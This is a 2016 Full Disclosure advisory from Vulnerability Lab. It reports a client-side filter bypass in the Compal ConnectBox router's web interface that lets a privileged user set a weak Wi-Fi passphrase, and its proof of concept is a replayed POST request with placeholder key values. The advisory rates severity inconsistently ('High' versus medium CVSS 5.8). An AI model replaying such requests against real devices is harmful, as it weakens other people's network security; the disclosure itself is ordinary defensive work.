
Date: Wed, 3 Feb 2016 13:43:41 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] Compal ConnectBox Wireless - Passphrase Settings Filter Bypass
 Vulnerability

Document Title:
===============
Compal ConnectBox Wireless - Passphrase Settings Filter Bypass Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1705


Release Date:
=============
2016-02-03


Vulnerability Laboratory ID (VL-ID):
====================================
1705


Common Vulnerability Scoring System:
====================================
5.8


Product & Service Introduction:
===============================
Wireless modem CBN CH7465LG is the world`s most compact voice modem. EuroDOCSIS 3.0 in the stylish and elegant design suitable for home, 
home office or smaller businesses. It can be used in households with one or more computers with support. Wireless remote access to a wireless modem.

(Copy of the Homepage: https://infotomb.com/truac.pdf )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Core Research Team discovered a filter bypass web vulnerability in the official  Compal Wireless ConnectBox web-application.


Vulnerability Disclosure Timeline:
==================================
2016-02-03: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Compal
Product: ConnectBox - (Wireless) 4.01 - H7465LG-NCIP-4.50.18.15-1-NOSH


Exploitation Technique:
=======================
Remote


Severity Level:
===============
High


Technical Details & Description:
================================
A filter bypass web vulnerability has been discovered in the official Compal Wireless ConnectBox web-application.
The filter bypass web vulnerability allows an attacker to evade the controls of a restriction- or protection mechanism.

The issue allows an attacker to change the wireless passphrase to an insecure passphrase which is forbidden by the applications 
javascript engine. The vulnerability affects the `ConnectBox` manufactured by Compal for the local small ISP - Unitymedia. 
They are offering high-speed internet access over Cable (TV).

To bypass the filter you only need to replay the POST which changes the wireless passphrase and change the parameters `wlPSkey2g` 
and `wlPSkey5g`. The filter won`t allow you to set a passphrase without specialchars or uppercase/lowercase letters. By bypassing 
the filter you can set any passphrase (wpa needs at least 8 chars).

The security risk of the filter bypass vulnerability is estimated as medium and the cvss (common vulnerability scoring system) count is 5.8. 
Exploitation of the filter bypass vulnerability requires a privileged web-application user account with privileged access and medium user interaction. 
Successful exploitation of the vulnerability results in unauthorized access by setting a low secured passphrase key for wpa and wpa2.

Model:			CH7465LG-LC	
Hardware Version	4.01
Software Version	CH7465LG-NCIP-4.50.18.15-1-NOSH


Proof of Concept (PoC):
=======================
The vulnerability can be exploited by remote attackers in the local networka with privileged web-application user account or privileged access and medium user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information or steps below to continue.

--- PoC Session Logs [POST] ---
Status: 200[Ok]
POST http://localhost/xml/setter.xml 
Load Flags[LOAD_BACKGROUND  LOAD_BYPASS_LOCAL_CACHE_IF_BUSY ] Größe des Inhalts[-1] Mime Type[text/xml]
Request Header:
      Host[localhost]
      User-Agent[Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0]
      Accept[text/plain, */*; q=0.01]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      DNT[1]
      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]
      X-Requested-With[XMLHttpRequest]
      Referer[http://192.168.0.1/index.html]
      Content-Length[196]
      Cookie[SID=3524502016]
      Connection[keep-alive]
POST-Daten:
      token[3753771008]
      fun[318]
      wlBandMode2g[1]
      wlBandMode5g[1]
      wlSsid2g[0xdeadbeef]
      wlSsid5g[0xdeadbeef]
      wlPSkey2g[<[CHANGE RIGHT HERE]>]
      wlPSkey5g[<[CHANGE RIGHT HERE]>]
      wlSecurity2g[8]
      wlSecurity5g[8]
      wlWpaalg2g[3]
      wlWpaalg5g[3]
Response Header:
      Server[NET-DK/1.0]
      Date[Tue, 02 Feb 2016 14:12:02 GMT]
      Last-Modified[Mon, 12 Oct 2015 11:00:12 GMT]
      Pragma[no-cache]
      Expires[-1]
      Content-Type[text/xml]
      Connection[close]


Security Risk:
==============
The security risk of the filter bypass web vulnerability in the web-application of the hardware models is estimated as medium. (CVSS 5.8)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Marco Onorati


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com
PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/